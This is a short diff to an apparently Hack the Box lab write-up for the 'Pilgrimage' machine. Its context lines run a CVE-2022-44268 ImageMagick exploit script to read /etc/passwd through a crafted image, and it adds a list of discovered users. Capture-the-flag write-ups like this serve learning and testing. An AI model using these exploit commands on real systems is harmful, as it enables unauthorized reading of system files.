@@ -95,3 +95,8 @@ python3 CVE-2022-44268.py --image image.png --file-to-read /etc/passwd --output 
 python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/64f5b8058a661.png
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d7fb8b1c-f9c6-4481-8c53-532b754d4bd8)
+
+- Identified Users
+  - root
+  - emily
+
